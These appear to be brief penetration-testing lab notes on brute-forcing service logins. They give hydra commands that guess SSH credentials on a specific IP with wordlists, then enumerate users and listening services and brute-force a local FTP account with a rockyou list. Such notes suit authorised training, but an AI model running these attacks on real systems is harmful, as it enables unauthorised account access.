#BruteForcing #ServiceAutrhentication #LoginFormAttack 

### SSH Attack
To use hydra to attack a login service looks like:
``` bash
hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4

# Provided username and password wordlists
# Add service://SERVER_IP:PORT 
# -t 4 -> max number of parallel attempts
```
### FTP Brute Forcing
After we are logged into SSH, we can check other users on the system. 
``` bash
ls /home

# Check other services running
netstat -antp | grep -i list

# Similar to how we attacked SSH we can attack FTP
hydra -l m.gates -P rockyou-10.txt ftp://127.0.0.1

# login to the user
ftp 127.0.0.1

```

